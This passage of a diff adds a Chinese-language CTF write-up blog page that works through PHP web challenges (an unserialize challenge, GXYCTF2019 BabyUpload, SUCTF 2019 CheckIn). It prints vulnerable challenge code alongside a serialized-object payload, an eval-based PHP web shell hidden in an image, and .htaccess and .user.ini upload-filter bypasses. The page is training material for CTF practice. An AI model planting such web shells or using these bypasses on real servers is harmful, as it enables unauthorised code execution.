+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">op</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;2&#34;</span>) {
+</span></span><span style="display:flex;"><span>            $res <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">read</span>();
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">output</span>($res);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">output</span>(<span style="color:#e6db74">&#34;Bad Hacker!&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">write</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">content</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>((<span style="color:#a6e22e">string</span>)$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">content</span>) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span>) {
+</span></span><span style="display:flex;"><span>                $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">output</span>(<span style="color:#e6db74">&#34;Too long!&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">die</span>();
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_put_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">content</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>($res) $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">output</span>(<span style="color:#e6db74">&#34;Successful!&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">output</span>(<span style="color:#e6db74">&#34;Failed!&#34;</span>);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">output</span>(<span style="color:#e6db74">&#34;Failed!&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">read</span>() {
+</span></span><span style="display:flex;"><span>        $res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span>)) {
+</span></span><span style="display:flex;"><span>            $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $res;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">output</span>($s) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;[Result]: &lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $s;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __destruct() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">op</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">op</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1&#34;</span>;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">content</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">process</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">is_valid</span>($s) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">strlen</span>($s); $i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>(<span style="color:#a6e22e">ord</span>($s[$i]) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">ord</span>($s[$i]) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">125</span>))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET{<span style="color:#e6db74">&#39;str&#39;</span>})) {
+</span></span><span style="display:flex;"><span>    $str <span style="color:#f92672">=</span> (<span style="color:#a6e22e">string</span>)$_GET[<span style="color:#e6db74">&#39;str&#39;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_valid</span>($str)) {
+</span></span><span style="display:flex;"><span>        $obj <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($str);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>payload如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">O:</span><span style="color:#ae81ff">11</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;FileHandler&#34;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">:</span>{<span style="color:#960050;background-color:#1e0010">s:5:</span><span style="color:#f92672">&#34;*op&#34;</span><span style="color:#960050;background-color:#1e0010">;i</span>:<span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">;s</span>:<span style="color:#ae81ff">11</span>:<span style="color:#e6db74">&#34;*filename&#34;</span><span style="color:#960050;background-color:#1e0010">;s</span>:<span style="color:#ae81ff">8</span>:<span style="color:#e6db74">&#34;flag.php&#34;</span><span style="color:#960050;background-color:#1e0010">;s</span>:<span style="color:#ae81ff">10</span>:<span style="color:#e6db74">&#34;*content&#34;</span><span style="color:#960050;background-color:#1e0010">;s</span>:<span style="color:#ae81ff">2</span>:<span style="color:#e6db74">&#34;hi&#34;</span><span style="color:#960050;background-color:#1e0010">;</span>}
+</span></span></code></pre></div><h2 id="gxyctf2019babyupload">[GXYCTF2019]BabyUpload</h2>
+<pre tabindex="0"><code>https://github.com/imaginiso/GXY_CTF/tree/master/Web/babyupload
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;meta http-equiv=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">Content-Type</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> content=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">text/html; charset=utf-8</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> /&gt; 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;title&gt;Upload&lt;/title&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;form action=</span><span style="color:#ae81ff">\&#34;\&#34;</span><span style="color:#e6db74"> method=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">post</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> enctype=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">multipart/form-data</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">上传文件&lt;input type=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">file</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> name=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">uploaded</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> /&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;input type=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">submit</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> name=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">submit</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> value=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">上传</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> /&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/form&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;user&#39;</span>])){
+</span></span><span style="display:flex;"><span>    $_SESSION[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>((<span style="color:#a6e22e">string</span>)<span style="color:#a6e22e">time</span>() <span style="color:#f92672">.</span> (<span style="color:#a6e22e">string</span>)<span style="color:#a6e22e">rand</span>(<span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">1000</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_FILES[<span style="color:#e6db74">&#39;uploaded&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $target_path  <span style="color:#f92672">=</span> <span style="color:#a6e22e">getcwd</span>() <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;/upload/&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">md5</span>($_SESSION[<span style="color:#e6db74">&#39;user&#39;</span>]);
+</span></span><span style="display:flex;"><span>    $t_path <span style="color:#f92672">=</span> $target_path <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">basename</span>($_FILES[<span style="color:#e6db74">&#39;uploaded&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>]);
+</span></span><span style="display:flex;"><span>    $uploaded_name <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;uploaded&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>];
+</span></span><span style="display:flex;"><span>    $uploaded_ext  <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($uploaded_name, <span style="color:#a6e22e">strrpos</span>($uploaded_name,<span style="color:#e6db74">&#39;.&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    $uploaded_size <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;uploaded&#39;</span>][<span style="color:#e6db74">&#39;size&#39;</span>];
+</span></span><span style="display:flex;"><span>    $uploaded_tmp  <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;uploaded&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>];
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/ph/i&#34;</span>, <span style="color:#a6e22e">strtolower</span>($uploaded_ext))){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;后缀名不能有ph！&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ((($_FILES[<span style="color:#e6db74">&#34;uploaded&#34;</span>][<span style="color:#e6db74">&#34;type&#34;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &#34;</span>) <span style="color:#f92672">||</span> ($_FILES[<span style="color:#e6db74">&#34;uploaded&#34;</span>][<span style="color:#e6db74">&#34;type&#34;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;image/jpeg&#34;</span>) <span style="color:#f92672">||</span> ($_FILES[<span style="color:#e6db74">&#34;uploaded&#34;</span>][<span style="color:#e6db74">&#34;type&#34;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;image/pjpeg&#34;</span>)) <span style="color:#f92672">&amp;&amp;</span> ($_FILES[<span style="color:#e6db74">&#34;uploaded&#34;</span>][<span style="color:#e6db74">&#34;size&#34;</span>] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2048</span>)){
+</span></span><span style="display:flex;"><span>            $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($uploaded_tmp);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/\&lt;\?/i&#34;</span>, $content)){
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;诶，别蒙我啊，这标志明显还是php啊&#34;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mkdir</span>(<span style="color:#a6e22e">iconv</span>(<span style="color:#e6db74">&#34;UTF-8&#34;</span>, <span style="color:#e6db74">&#34;GBK&#34;</span>, $target_path), <span style="color:#ae81ff">0777</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">move_uploaded_file</span>($uploaded_tmp, $t_path);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>$t_path<span style="color:#e6db74">}</span><span style="color:#e6db74"> succesfully uploaded!&#34;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;上传类型也太露骨了吧！&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>规定只能上传jpg，所以先上传一个.htaccess，再上传一个jpg，不过对文件过滤内容，如果包含&lt;?则被过滤，所以使用以下方式来绕过</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;php&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($_POST[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><h2 id="suctf-2019checkin">[SUCTF 2019]CheckIn</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;!</span><span style="color:#a6e22e">DOCTYPE</span> <span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">meta</span> <span style="color:#a6e22e">http</span><span style="color:#f92672">-</span><span style="color:#a6e22e">equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;X-UA-Compatible&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ie=edge&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Upload</span> <span style="color:#a6e22e">Labs</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h2</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Upload</span> <span style="color:#a6e22e">Labs</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">h2</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;index.php&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;multipart/form-data&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">label</span> <span style="color:#66d9ef">for</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">文件名：</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">label</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;fileUpload&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">br</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;upload&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;提交&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">form</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// error_reporting(0);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$userdir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uploads/&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">md5</span>($_SERVER[<span style="color:#e6db74">&#34;REMOTE_ADDR&#34;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">file_exists</span>($userdir)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mkdir</span>($userdir, <span style="color:#ae81ff">0777</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">file_put_contents</span>($userdir <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;/index.php&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;upload&#34;</span>])) {
+</span></span><span style="display:flex;"><span>    $tmp_name <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#34;fileUpload&#34;</span>][<span style="color:#e6db74">&#34;tmp_name&#34;</span>];
+</span></span><span style="display:flex;"><span>    $name <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#34;fileUpload&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$tmp_name) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;filesize too big!&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$name) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;filename cannot be empty!&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    $extension <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($name, <span style="color:#a6e22e">strrpos</span>($name, <span style="color:#e6db74">&#34;.&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/ph|htacess/i&#34;</span>, $extension)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;illegal suffix!&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mb_strpos</span>(<span style="color:#a6e22e">file_get_contents</span>($tmp_name), <span style="color:#e6db74">&#34;&lt;?&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">FALSE</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;&amp;lt;? in contents!&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    $image_type <span style="color:#f92672">=</span> <span style="color:#a6e22e">exif_imagetype</span>($tmp_name);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$image_type) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;exif_imagetype:not image!&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    $upload_file_path <span style="color:#f92672">=</span> $userdir <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">.</span> $name;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">move_uploaded_file</span>($tmp_name, $upload_file_path);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Your dir &#34;</span> <span style="color:#f92672">.</span> $userdir<span style="color:#f92672">.</span> <span style="color:#e6db74">&#39; &lt;br&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Your files : &lt;br&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">scandir</span>($userdir));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>过滤了php后缀和.htaccess，所以考虑php的用户配置文件.user.ini</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span><span style="color:#75715e"># auto_prepend_file string</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Specifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require function, so include_path is used.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># auto_prepend_file 就相当于 require function，可以用于文件包含</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">auto_prepend_file</span><span style="color:#f92672">=</span><span style="color:#e6db74">1.jpg</span>
+</span></span></code></pre></div><p>接着传入图片马，注意蚁剑利用路径应为.user.ini和1.jpg的共同目录</p>
+<h2 id="gxyctf2019babysqli">[GXYCTF2019]BabySQli</h2>
+
+    </article>
+
+    
+
+
+
+  </div>
+</div>
+
+  </main>
+  <footer class="flex flex-none justify-center">
+    <section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300">
+  <div class="flex flex-row">
+    
+  
+  
+  
+  
+    <a href="https://twitter.com/FanBig03" target="_blank" title="Twitter" class="flex flex-row mr-2">
+      <span class="hidden">Twitter</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-x" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 4l11.733 16h4.267l-11.733 -16z"></path>
+   <path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772"></path>
+</svg>
+ </i>
+    </a>
+  
+  
